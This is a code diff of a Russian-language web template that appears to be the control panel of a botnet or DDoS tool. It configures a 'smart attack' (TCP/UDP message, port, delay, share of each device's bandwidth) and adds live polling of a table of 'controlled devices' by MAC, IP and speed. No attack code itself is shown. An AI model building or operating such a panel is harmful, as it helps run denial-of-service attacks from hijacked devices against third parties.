@@ -87,7 +87,7 @@
                     <div class="col-xs-4 col-sm-4 col-md-3 col-lg-2">
                         <label>Задержка</label>
                         <br>
-                        <input name="timeout" type="number" value="2000">
+                        <input name="timeout_1" type="number" value="2000">
                     </div>
                     <div class="col-xs-4 col-sm-6 col-md-5 col-lg-4">
                         <label>TCP/UDP сообщение</label>
@@ -128,6 +128,11 @@
                 <legend>3. Настройка умной атаки</legend>
                 <div class="row">
                     <div class="col-xs-4 col-sm-4 col-md-3 col-lg-2">
+                        <label>Задержка</label>
+                        <br>
+                        <input name="timeout_2" type="number" value="2000">
+                    </div>
+                    <div class="col-xs-4 col-sm-4 col-md-3 col-lg-2">
                         <label title="Сколько трафика будет уходить на атаку у подконтрольного устройства">%
                             скорости</label>
                         <br>
@@ -165,9 +170,10 @@
                 <legend>4. Подконтрольные устройства</legend>
                 <div class="row" id="table_users">
                     {% for user in users|reverse %}
-                        <div class="col-xs-4 col-sm-4 col-md-4 col-lg-3 table-user">
+                        <div class="col-xs-4 col-sm-4 col-md-4 col-lg-3">
                             <input class="border-0" type="text" id="scales"
-                                   name="mac_address" value="{{ user.mac }}"
+                                   name="mac_address"
+                                   value="{{ user.mac }}"
                                    disabled/>
                         </div>
                         <div class="col-xs-2 col-sm-3 col-md-4 col-lg-3">
@@ -182,7 +188,7 @@
                         </div>
                         <div class="col-xs-2 col-sm-2 col-md-2 col-lg-2 text-end">
                             {% set internet_speed = user.internet_speed | int %}
-                            {% if internet_speed // 1048576 == 0 %}
+                            {% if internet_speed // 1048576 == 0 or user.last_seen|float < last_seen_max %}
                                 <label>-</label>
                             {% else %}
                                 <label>{{ internet_speed // 1048576 }}
@@ -252,17 +258,81 @@
 
             document.getElementsByName('msg_tcp_udp2')[0].value = "{{ msg_tcp_udp }}";
             document.getElementsByName('port2')[0].value = "{{ port }}";
+            document.getElementsByName('timeout_2')[0].value = "{{ timeout }}"
         {% else %}
             document.getElementsByName('msg_tcp_udp1')[0].value = "{{ msg_tcp_udp }}";
             document.getElementsByName('port1')[0].value = "{{ port }}";
+            document.getElementsByName('timeout_1')[0].value = "{{ timeout }}"
         {% endif %}
 
-        document.getElementsByName('timeout')[0].value = "{{ timeout }}"
         document.getElementsByName('max_thread')[0].value = "{{ max_thread }}";
         document.getElementsByName('percent')[0].value = "{{ percent }}";
         change_method()
     </script>
 {% endif %}
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<script type="text/javascript">
+    function updateUserTable(x) {
+        $.ajax({
+            method: "POST",
+            url: "{{ url_for('get_users') }}",
+            dataType: 'json',
+            success: function (msgBackFromServer) {
+                data = JSON.stringify(msgBackFromServer)
+                data = JSON.parse(data)['users']
+                table_user = document.getElementById('table_users')
+                console.log(table_user)
+                while (table_user.firstChild) {
+                    table_user.removeChild(table_user.lastChild);
+                }
+
+                console.log(data)
+
+                container = document.getElementById('table_users')
+                for (var key in data) {
+                    user = data[key]
+                    if (user['online']) {
+                        online_status = 'В сети'
+                    } else {
+                        online_status = 'Не в сети'
+                    }
+
+                    internet_speed = Math.round(user['internet_speed'] / 1048576)
+                    if (internet_speed < 1 || online_status === 'Не в сети') {
+                        internet_speed_status = '-'
+                    } else {
+                        internet_speed_status = internet_speed + ' мб/с'
+                    }
+
+                    container.innerHTML += `
+                        <div class="col-xs-4 col-sm-4 col-md-4 col-lg-3">
+                            <input class="border-0" type="text" id="scales"
+                                   name="mac_address"
+                                   value="${user['mac']}"
+                                   disabled/>
+                        </div>
+                        <div class="col-xs-2 col-sm-3 col-md-4 col-lg-3">
+                            <label>${user['ip']}</label>
+                        </div>
+                        <div class="col-xs-2 col-sm-2 col-md-3 col-lg-2">
+                            <label>${online_status}</label>
+                        </div>
+                        <div class="col-xs-2 col-sm-2 col-md-2 col-lg-2 text-end">
+                                <label>${internet_speed_status}</label>
+                        </div>
+                        <hr class="mt-2">
+                    `
+                }
+            },
+            error: function (msgBackFromServer) {
+                console.log('Ошибка обновление талицы пользователей...')
+            }
+        })
+        setTimeout(updateUserTable, 5000);
+    }
+
+    updateUserTable()
+</script>
 
 </body>
 </html>
